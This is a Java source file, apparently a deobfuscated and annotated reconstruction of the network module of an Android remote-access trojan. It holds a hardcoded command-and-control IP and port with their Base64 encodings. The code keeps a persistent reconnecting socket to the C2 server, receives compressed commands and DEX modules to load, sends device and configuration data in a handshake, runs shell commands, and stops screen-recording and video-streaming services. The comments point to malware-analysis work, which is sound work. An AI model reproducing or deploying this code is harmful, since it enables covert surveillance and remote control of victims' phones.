package com.android.pictach;

import android.content.Context;
import android.content.Intent;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.concurrent.ThreadPoolExecutor;

/**
 * NetworkManager — Raw TCP socket connection to C2 server.
 *
 * This is the actual phone ↔ attacker connection layer.
 *
 * Connection target (decoded from love.java):
 *   Host: 64.89.161.188   (decoded from Base64: "NjQuODkuMTYxLjE4OA")
 *   Port: 7771             (decoded from Base64: "Nzc3MQ")
 *
 * Protocol:
 *   All data is GZIP compressed (Utils.gzipCompress / gzipDecompress).
 *   All packets are assembled by Utils.buildPacket().
 *
 *   INBOUND packet format (from C2 server):
 *     [size_part1_string] NULL [size_part2_string] NULL [part1_bytes + part2_bytes]
 *     part1 = GZIP-compressed command/class bytes → decompressed → Config.str
 *     part2 = GZIP-compressed DEX module bytes    → decompressed → Config.byt
 *
 *   OUTBOUND packet format (to C2 server):
 *     Assembled by Utils.buildPacket(typeStr, dataBytes)
 *     [compressed_type_len] NULL [compressed_data_len] NULL [compressed_type + compressed_data]
 *
 * Flow:
 *   1. connect()  — opens TCP socket, retries until connected
 *   2. startReceiveLoop() — reads packets from server, queues in love.commandQueue
 *   3. sendToC2() — sends data back to server (async via thread pool)
 */
public class NetworkManager {

    // ─── Connection state ─────────────────────────────────────────────────────

    public static InetAddress      serverAddress    = null;
    public static Context          ctx              = null;
    public static String           hostString       = null;  // da_NetworkManager_da
    public static boolean          isReceiving      = false; // ec_NetworkManager_ho
    public static String           portString       = null;  // fa__NetworkManager_da
    public static DataInputStream  inputStream      = null;  // inputnew
    public static OutputStream     outputStream     = null;  // outpu_NetworkManager_tnew
    public static boolean          isConnected      = false; // f1032q
    public static Socket           socket           = null;  // rec_NetworkManager_iver
    public static long             readDelayMs      = 250L;  // s_NetworkManager_s
    public static InetSocketAddress socketAddress   = null;  // sca_NetworkManager_drees

    // Connection timeouts
    public static final int CONNECT_TIMEOUT_MS  = 45000;   // t_NetworkManager_t
    public static final int BUFFER_SIZE         = 204800;  // u_NetworkManager_u (200KB)

    // Synchronization locks
    public static Object sendLock    = new Object(); // f1034y — lock for outbound sends
    public static Object receiveLock = new Object(); // f1033r — lock for inbound receive loop

    // C2 server address parts (split by ":" separator, reassembled at runtime)
    // These are populated from love.Host and love.Port after Base64 decode
    public static String T2 = "CRAZY"; // placeholder — replaced at runtime
    public static String T3 = "CRAZY";
    public static String T4 = "CRAZY";
    public static String T5 = "CRAZY";
    public static String T6 = "CRAZY";
    public static String T7 = "CRAZY";

    // ─── Entry point ─────────────────────────────────────────────────────────

    /**
     * Entry point called by Api.initializeAndConnect().
     * Stores context and address strings, then starts the connect loop.
     *
     * host = decoded C2 IP string (e.g. "64.89.161.188")
     * port = decoded C2 port string (e.g. "7771")
     *
     * Original obfuscated name: m590x651ba32 / fundamentalgseedsb...d46
     */
    public static void initialize(String host, String port, Context context) {
        ctx        = context;
        hostString = host;
        portString = port;
        connectLoop(host, port);
    }

    // ─── Connection loop ──────────────────────────────────────────────────────

    /**
     * Opens TCP socket to C2 server. Runs in a new thread.
     * Retries continuously until connected.
     *
     * host = colon-separated list of IPs (tries each in order)
     * port = colon-separated list of ports (parallel to host list)
     *
     * On connection: sets isConnected=true, sets up streams,
     * then calls startReceiveLoop() to begin reading commands.
     *
     * On failure: calls closeAll() and retries after 1 second.
     *
     * Original obfuscated name: m594x488d91cf / zonesdregistrard...n44
     */
    public static void connectLoop(final String host, final String port) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                // Split host and port strings by ":" (Utils.colonSeparator)
                String[] hosts = host.split(Utils.colonSeparator);
                String[] ports = port.split(Utils.colonSeparator);

                do {
                    // Acquire WakeLock/WifiLock if not in power save mode
                    if (!Utils.isPowerSaveMode(NetworkManager.ctx)) {
                        Utils.acquireLocks(NetworkManager.ctx, false);
                    }

                    if (hosts.length == hosts.length) { // always true — original code structure
                        int i = 0;
                        while (true) {
                            try {
                                // Resolve IP and create socket address
                                NetworkManager.serverAddress =
                                        InetAddress.getByName(hosts[i]);
                                NetworkManager.socketAddress =
                                        new InetSocketAddress(
                                                NetworkManager.serverAddress,
                                                Integer.valueOf(ports[i]).intValue()
                                        );
                                NetworkManager.socket = new Socket();
                                try {
                                    NetworkManager.socket.setSoTimeout(0);
                                    NetworkManager.socket.setKeepAlive(true);
                                } catch (Exception unused) {
                                }
                                // Connect with 60 second timeout
                                NetworkManager.socket.connect(
                                        NetworkManager.socketAddress, 60000);
                                NetworkManager.isConnected =
                                        NetworkManager.socket.isConnected();
                            } catch (Exception unused2) {
                                closeAll("connectFailed");
                            }

                            if (NetworkManager.isConnected) {
                                // Connected — configure socket and set up streams
                                try {
                                    NetworkManager.socket.setSendBufferSize(BUFFER_SIZE);
                                    NetworkManager.socket.setReceiveBufferSize(BUFFER_SIZE);
                                    NetworkManager.inputStream = new DataInputStream(
                                            new BufferedInputStream(
                                                    NetworkManager.socket.getInputStream()));
                                    NetworkManager.outputStream =
                                            NetworkManager.socket.getOutputStream();
                                } catch (Exception unused3) {
                                }
                                break;
                            }

                            // Not connected — try next host/port pair
                            closeAll("tryNextHost");
                            try {
                                Thread.sleep(1L);
                            } catch (InterruptedException unused4) {
                            }
                            i++;
                            if (i > hosts.length - 1) break;
                        }
                    }

                    Utils.releaseLocks(false);
                    try {
                        Thread.sleep(1000L);
                    } catch (InterruptedException unused5) {
                    }

                } while (!NetworkManager.isConnected);

                // Socket connected — start receive loop
                if (NetworkManager.isConnected) {
                    startReceiveLoop();
                }
            }
        }).start();
    }

    // ─── Receive loop ─────────────────────────────────────────────────────────

    /**
     * Continuously reads packets from the C2 server socket.
     * Runs in a new thread, synchronized on receiveLock.
     *
     * Packet parsing protocol:
     *   Reads byte by byte. NULL bytes (0x00) are delimiters.
     *   First NULL  → iArr[0] = length of first part (class/command bytes)
     *   Second NULL → iArr[1] = length of second part (DEX module bytes)
     *   Then reads (iArr[0] + iArr[1]) bytes as one chunk.
     *   Splits and decompresses → creates Config → adds to love.commandQueue.
     *
     * On disconnect: calls closeAll(), then reconnects via connectLoop().
     *
     * Original obfuscated name: r_NetworkManager_cv
     */
    public static void startReceiveLoop() {
        try {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    synchronized (NetworkManager.receiveLock) {
                        if (!Utils.isPowerSaveMode(NetworkManager.ctx)) {
                            Utils.acquireLocks(NetworkManager.ctx, false);
                        }

                        isReceiving = true;

                        // Send initial handshake to C2 server
                        sendHandshake("handshakeInit");

                        try {
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            int[] lengths = {-1, -1}; // [0]=first part length, [1]=second part length
                            byte[] singleByte = new byte[1];

                            outer:
                            while (true) {
                                int nullCount = -1;
                                int expectedTotal = 0;

                                while (true) {
                                    int read = NetworkManager.inputStream.read(singleByte);
                                    if (read <= 0) break outer; // connection closed

                                    love.inx = -1;

                                    if (singleByte.length > 1) {
                                        // Multi-byte chunk read
                                        baos.write(singleByte, 0, read);
                                        if (baos.toByteArray().length == expectedTotal) {
                                            break; // full packet received
                                        }
                                    } else if (singleByte[0] == 0) {
                                        // NULL delimiter
                                        nullCount++;
                                        if (nullCount == 0) {
                                            // First NULL: read first part length
                                            lengths[0] = Integer.valueOf(
                                                    new String(baos.toByteArray(), "UTF-8")
                                            ).intValue();
                                            baos.reset();
                                        } else if (nullCount == 1) {
                                            // Second NULL: read second part length
                                            lengths[1] = Integer.valueOf(
                                                    new String(baos.toByteArray(), "UTF-8")
                                            ).intValue();
                                            baos.reset();
                                            try {
                                                expectedTotal = lengths[0] + lengths[1];
                                            } catch (Exception unused) {
                                            }
                                            // Resize receive buffer to match expected packet
                                            NetworkManager.socket.setReceiveBufferSize(expectedTotal);
                                            // Switch to multi-byte read for the data chunk
                                            singleByte = new byte[expectedTotal];
                                        }
                                        // nullCount > 1: reset (extra NULLs ignored)
                                        nullCount = -1;
                                    } else {
                                        // Regular data byte
                                        baos.write(singleByte, 0, read);
                                        try {
                                            Thread.sleep(NetworkManager.readDelayMs);
                                        } catch (InterruptedException unused2) {
                                        }
                                    }
                                }

                                // Full packet received — parse it
                                NetworkManager.socket.setReceiveBufferSize(BUFFER_SIZE);

                                // Decompress both parts and queue as Config
                                love.commandQueue.add(new Config(
                                        Utils.gzipDecompress(
                                                Utils.extractFirstPart(baos.toByteArray(), lengths)),
                                        Utils.gzipDecompress(
                                                Utils.extractSecondPart(baos.toByteArray(), lengths))
                                ));

                                baos.reset();
                                lengths[0] = -1;
                                lengths[1] = -1;
                            }

                        } catch (Exception | OutOfMemoryError unused3) {
                        }

                        // Connection dropped — clean up and reconnect
                        closeAll("receiveLoopEnded");
                        Utils.releaseLocks(false);
                        connectLoop(NetworkManager.hostString, NetworkManager.portString);
                        isReceiving = false;
                    }
                }
            }).start();
        } catch (Exception unused) {
        }
    }

    // ─── Send ─────────────────────────────────────────────────────────────────

    /**
     * Sends data to C2 server asynchronously.
     * typeStr = command type code (from love.commandCodes[])
     * data    = raw bytes to send
     *
     * Assembles packet with Utils.buildPacket(), then writes to socket output.
     * Synchronized on sendLock to prevent concurrent writes.
     *
     * On failure: calls closeAll() to reset connection.
     *
     * Original obfuscated name: m592xf762f521 / locatevlibertyq...q47
     */
    public static void sendToC2(final String typeStr, final byte[] data) {
        try {
            if (((ThreadPoolExecutor) Utils.threadPoolExecutor).getActiveCount()
                    >= Utils.maxThreadCount) {
                return;
            }
            Utils.threadPoolExecutor.execute(new Runnable() {
                @Override
                public void run() {
                    try {
                        synchronized (NetworkManager.sendLock) {
                            byte[] packet = Utils.buildPacket(typeStr, data);
                            NetworkManager.socket.setSendBufferSize(packet.length);
                            NetworkManager.outputStream.write(packet, 0, packet.length);
                        }
                    } catch (Exception unused) {
                        closeAll("sendFailed");
                    }
                }
            });
        } catch (NullPointerException unused) {
        }
    }

    // ─── Handshake ────────────────────────────────────────────────────────────

    /**
     * Sends the initial handshake packet to C2 server after connecting.
     * Packet contains:
     *   - C2 server IP + port
     *   - Config keys (FTX0..3)
     *   - Server hostname
     *   - Config resource string
     *   - "[CR]" marker
     *
     * "CRAZYCRAZYCRAZYCRAZYCRAZYCRAZYCRAZY".replace(..., "") → "" (empty, stripped out)
     *
     * Original obfuscated name: m591x9c827d9b / laughhbarb...v45
     */
    public static void sendHandshake(String trigger) {
        if (trigger.length() > 0) {
            try {
                sendToC2(
                        String.valueOf(love.loadedModuleCount),
                        (
                            socketAddress.getAddress().getHostAddress()
                            + Utils.colonSeparator + socketAddress.getPort()
                            + Utils.colonSeparator + Config.FTX0
                            + Utils.colonSeparator + Config.FTX1
                            + Utils.colonSeparator + Config.FTX2
                            + Utils.colonSeparator + Config.FTX3
                            + Utils.colonSeparator + serverAddress.getHostName()
                            + Utils.colonSeparator
                            + ctx.getResources().getString(C0199R.id.difficultye56)
                            + Utils.colonSeparator + "[CR]"
                            + Utils.colonSeparator
                            // Strip the repeated CRAZY string → empty string
                            + "CRAZYCRAZYCRAZYCRAZYCRAZYCRAZYCRAZY"
                        ).replace("CRAZYCRAZYCRAZYCRAZYCRAZYCRAZYCRAZY", "").getBytes()
                );
            } catch (Exception unused) {
            }
        }
    }

    // ─── Shell command ────────────────────────────────────────────────────────

    /**
     * Executes a shell command using the device hostname.
     * Called by Api when C2 sends the "ox" command type.
     * love.commandCodes[0] = the command type code checked by Api.
     *
     * Original obfuscated name: m593ox / ox
     */
    public static void runCommand() {
        try {
            if (love.loadedModuleCount != -1) {
                Utils.executeShellCommand(
                        love.commandCodes[0] + serverAddress.getHostName()
                );
            }
        } catch (Exception unused) {
        }
    }

    // ─── Close / disconnect ───────────────────────────────────────────────────

    /**
     * Closes all socket streams and stops dependent services.
     * Called on connection error, disconnect, or explicit close command.
     *
     * After closing:
     *   - Stops com.class service (screen recording)
     *   - Stops video.class service (video streaming)
     *   - Sets isConnected = false, love.isConnected = false
     *
     * Original obfuscated name: CLOSEALLINTENT
     */
    public static void closeAll(String reason) {
        love.isConnected = false;
        isConnected = false;

        try { socket.shutdownInput();              } catch (Exception unused)  {}
        try { socket.getOutputStream().close();    } catch (Exception unused2) {}
        try { socket.getInputStream().close();     } catch (Exception unused3) {}
        try { socket.close();                      } catch (Exception unused4) {}

        if (outputStream != null) {
            try { outputStream.close(); } catch (Exception unused5) {}
            outputStream = null;
        }
        if (inputStream != null) {
            try { inputStream.close(); } catch (Exception unused6) {}
            inputStream = null;
        }

        // Stop screen recording service if not already stopped
        if (!LoveApi0.isServiceNotRunning(com.class, ctx)) {
            ctx.stopService(new Intent(ctx, com.class));
        }

        // Stop video streaming service if not already stopped
        if (LoveApi0.isServiceNotRunning(video.class, ctx)) {
            return;
        }
        ctx.stopService(new Intent(ctx, video.class));
    }
}
